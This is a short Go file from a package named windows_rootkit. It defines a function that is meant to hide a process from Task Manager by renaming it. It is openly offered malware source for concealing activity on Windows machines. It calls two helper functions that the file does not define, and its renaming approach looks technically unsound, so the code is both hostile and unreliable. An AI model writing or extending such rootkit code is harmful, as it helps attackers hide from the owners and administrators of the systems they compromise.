package windows_rootkit

import (
	"fmt"
)

// Function to hide process on task manager via changing it's name
func HideProcessByName(ProcessName string, NewName string) {

	// Get handle of the process by its name
	handle, err := GetProcessHandleByName(ProcessName)
	if err != nil {
		panic(err)
	}

	// Change process name
	err = ChangeProcessName(handle, NewName)
	if err != nil {
		panic(err)
	}

	fmt.Printf("Process '%s' hidden as '%s'\n", ProcessName, NewName)
}
